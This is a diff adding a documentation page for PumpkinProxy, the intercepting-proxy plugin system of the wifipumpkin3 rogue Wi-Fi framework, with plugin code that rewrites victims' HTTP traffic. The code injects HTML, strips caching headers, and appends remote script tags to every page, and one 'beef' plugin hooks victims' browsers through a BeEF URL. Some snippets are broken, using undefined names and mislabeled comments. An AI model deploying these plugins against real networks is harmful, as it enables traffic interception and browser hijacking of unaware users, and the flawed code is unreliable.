@@ -1,0 +1,164 @@
+---
+title: 'Pumpkinproxy'
+description: 'PumpkinProxy is a transparent proxies fork about sslstrp.'
+---
+
+PumpkinProxy is a transparent proxies that you can use to intercept and manipulate HTTP traffic modifying requests and responses, that allow to inject javascripts into the targets visited. 
+
+
+### Overview 
+First of all write the import plugin tamplate 
+``` python
+from wifipumpkin3.plugins.extension.base import BasePumpkin
+```
+the basic plugin example:
+``` python
+from wifipumpkin3.plugins.extension.base import BasePumpkin
+
+
+class Example(PluginTemplate):
+    meta = {
+        "_name": "example plugin ",
+        "_version": "1.0",
+        "_description": "example plugin structure",
+        "_author": "by example",
+    }
+
+    # get name of plugin static
+    @staticmethod
+    def getName():
+        return Example.meta["_name"]
+
+    def __init__(self):
+        for key,value in self.meta.items():
+            self.__dict__[key] = value
+        self.ConfigParser = False # no requeire args
+
+    def handleHeader(self, request, key, value):
+        pass
+
+    def handleResponse(self, request, data):
+        return data
+```
+
+### Modify Packets 
+Simple fuctions that just adds a header to every request.. 
+ ``` python
+    def handleResponse(self, request, data):
+      data = str(html + "<h1> injected code html </h1>")
+      # request.uri url of website 
+      print("[{}] [Request]: {} | injected ".format(self._name, request.uri))
+      return data
+```
+
+example how to remove header from request and set no-cached parameter
+ ``` python
+    def handleHeader(self, request, key, value):
+        if key.decode().lower() == "cache-control":
+            value = "no-cache".encode()
+
+        if key.decode().lower() == "if-none-match":
+            value = "".encode()
+        if key.decode().lower() == "etag":
+            value = "".encode()
+```
+
+another example how to rewrite packet in real time 
+ ``` python
+from wifipumpkin3.plugins.extension.base import BasePumpkin
+from os import path
+from bs4 import BeautifulSoup
+
+class js_inject(BasePumpkin):
+    meta = {
+        "_name": "js_inject",
+        "_version": "1.1",
+        "_description": "url injection insert and use our own JavaScript code in a page.",
+        "_author": "by Maintainer",
+    }
+
+    @staticmethod
+    def getName():
+        return js_inject.meta["_name"]
+
+    def __init__(self):
+        for key, value in self.meta.items():
+            self.__dict__[key] = value
+        self.ConfigParser = True
+        self.url = self._config.get("set_js_inject", "url")
+
+    def handleResponse(self, request, data):
+
+        html = BeautifulSoup(data, "html.parser")
+        """
+        # To Allow CORS
+        if "Content-Security-Policy" in flow.response.headers:
+            del flow.response.headers["Content-Security-Policy"]
+        """
+        if html.body:
+            url = "{}".format(request.uri)
+            metatag = html.new_tag("script")
+            metatag.attrs["src"] = self.url
+            metatag.attrs["type"] = "text/javascript"
+            html.body.append(metatag)
+            data = str(html)
+            print("[{} js script Injected in [ {} ]".format(self._name, url))
+        return data
+```
+
+### Logging 
+all log will save data(pumpkin-prxoy.log) in your plugin.
+
+### How to add argumments 
+Now, if you want to add argumments in proxy.ini for show me on Pumpkin-Proxy->Settings.you need to add in directory "core/config/app/proxy.ini" the key (exampleplugin and set_exampleplugin).
+
+* exampleplugin key is the option checkbox to change and enable or disable plugin
+* set_exampleplugin this is key for search all argumments in Settings option.
+![plugin_key](http://i.imgur.com/oSvErrZ.png)
+
+### Example from Wp3 with Argummets 
+``` python
+from wifipumpkin3.plugins.extension.base import BasePumpkin
+from os import path
+from bs4 import BeautifulSoup
+
+
+class beef(BasePumpkin):
+    meta = {
+        "_name": "beef",
+        "_version": "1.1",
+        "_description": "url injection insert and use our own JavaScript code in a page.",
+        "_author": "by Maintainer",
+    }
+
+    @staticmethod
+    def getName():
+        return beef.meta["_name"]
+
+    def __init__(self):
+        for key, value in self.meta.items():
+            self.__dict__[key] = value
+        self.ConfigParser = True
+        self.urlhook = self.config.get("set_beef", "hook")
+
+    def handleResponse(self, request, data):
+
+        html = BeautifulSoup(data, "html.parser")
+        """
+        # To Allow CORS
+        if "Content-Security-Policy" in flow.response.headers:
+            del flow.response.headers["Content-Security-Policy"]
+        """
+        if html.body:
+            url = "{}".format(request.uri)
+            metatag = html.new_tag("script")
+            metatag.attrs["src"] = self.urlhook
+            metatag.attrs["type"] = "text/javascript"
+            html.body.append(metatag)
+            data = str(html)
+            print("[{} js script Injected in [ {} ]".format(self._name, url))
+        return data
+
+```
+
+You can easily implement a module to inject data into pages creating a python file in directory "plugins/extension/" and run `make setup` that on next start the prompt, the plugin is there.
